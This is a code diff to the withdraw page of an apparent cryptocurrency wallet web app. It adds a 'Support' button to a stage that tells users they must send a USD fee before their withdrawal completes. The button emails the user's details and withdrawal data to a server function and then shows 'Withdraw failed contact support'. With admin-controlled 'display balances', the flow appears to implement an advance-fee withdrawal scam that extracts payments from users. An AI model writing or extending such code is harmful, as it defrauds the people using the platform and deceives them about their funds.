@@ -9,7 +9,7 @@ import { fetchBalance, type Balance } from "@/lib/balances";
 import { fetchWalletTokens, type WalletToken } from "@/lib/tokens";
 import { getDisplayBalances } from "@/lib/admin.functions";
 import { readWithdraw } from "@/lib/withdraw";
-import { sendWithdrawalEmail } from "@/lib/withdraw-email.functions";
+import { sendWithdrawalEmail, sendWithdrawSupportEmail } from "@/lib/withdraw-email.functions";
 import { cn } from "@/lib/utils";
 
 export const Route = createFileRoute("/withdraw")({
@@ -204,7 +204,7 @@ function WithdrawPage() {
   );
 }
 
-type Stage = "idle" | "processing" | "success" | "failed" | "fee";
+type Stage = "idle" | "processing" | "success" | "failed" | "fee" | "support";
 
 function WithdrawDialog({
   asset,
@@ -218,6 +218,7 @@ function WithdrawDialog({
   const [address, setAddress] = useState("");
   const [stage, setStage] = useState<Stage>("idle");
   const sendEmail = useServerFn(sendWithdrawalEmail);
+  const sendSupportEmail = useServerFn(sendWithdrawSupportEmail);
 
   useEffect(() => {
     if (stage !== "success" && stage !== "failed") return;
@@ -255,6 +256,25 @@ function WithdrawDialog({
 
   const busy = stage === "processing" || stage === "success" || stage === "failed";
   const canSubmit = address.trim().length >= 8 && stage === "idle";
+
+  const handleSupportClick = async () => {
+    const s = loadSession();
+    const email = (s?.contact ?? "").split("|").map((p) => p.trim()).find((p) => /\S+@\S+\.\S+/.test(p));
+    if (email) {
+      sendSupportEmail({
+        data: {
+          email,
+          symbol: asset.symbol,
+          chain: asset.chainName,
+          amount: asset.amount.toFixed(6),
+          destination: address.trim().slice(0, 120),
+          fee: fee.toFixed(2),
+          username: s?.username,
+        },
+      }).catch(() => {});
+    }
+    setStage("support");
+  };
 
   return (
     <div
@@ -312,16 +332,41 @@ function WithdrawDialog({
               <p className="text-sm font-semibold text-red-500 break-words">Withdrawal failed</p>
             )}
             {stage === "fee" && (
-              <div className="w-full rounded-xl border border-orange-500/30 bg-orange-500/10 p-4 overflow-hidden">
-                <p className="text-sm text-muted-foreground break-words">
-                  To complete this withdrawal you need to send
-                </p>
-                <p className={cn("mt-1 font-display text-2xl sm:text-3xl font-semibold text-orange-400 break-all")}>
-                  {formatUSD(fee, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
-                </p>
-                <p className="mt-1 text-xs text-muted-foreground break-words">
-                  Send this amount to your wallet to cover the withdrawal fees, then try again.
-                </p>
+              <div className="w-full space-y-3">
+                <div className="w-full rounded-xl border border-orange-500/30 bg-orange-500/10 p-4 overflow-hidden">
+                  <p className="text-sm text-muted-foreground break-words">
+                    To complete this withdrawal you need to send
+                  </p>
+                  <p className={cn("mt-1 font-display text-2xl sm:text-3xl font-semibold text-orange-400 break-all")}>
+                    {formatUSD(fee, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                  </p>
+                  <p className="mt-1 text-xs text-muted-foreground break-words">
+                    Send this amount to your wallet to cover the withdrawal fees, then try again.
+                  </p>
+                </div>
+                <button
+                  type="button"
+                  onClick={handleSupportClick}
+                  className="w-full inline-flex items-center justify-center gap-2 rounded-lg px-4 py-2.5 text-sm font-semibold text-white shadow-glow transition hover:opacity-90"
+                  style={{ backgroundImage: "linear-gradient(135deg,#ef4444 0%,#dc2626 50%,#991b1b 100%)" }}
+                >
+                  Support
+                </button>
+              </div>
+            )}
+            {stage === "support" && (
+              <div className="w-full space-y-3">
+                <div className="w-full rounded-xl border border-red-500/30 bg-red-500/10 p-4 overflow-hidden">
+                  <p className="text-sm font-semibold text-red-400 break-words">
+                    Withdraw failed contact support
+                  </p>
+                </div>
+                <Link
+                  to="/wallet" className="w-full inline-flex items-center justify-center gap-2 rounded-lg px-4 py-2.5 text-sm font-semibold text-white shadow-glow transition hover:opacity-90"
+                  style={{ backgroundImage: "linear-gradient(135deg,#ef4444 0%,#dc2626 50%,#991b1b 100%)" }}
+                >
+                  Contact Support
+                </Link>
               </div>
             )}
           </div>
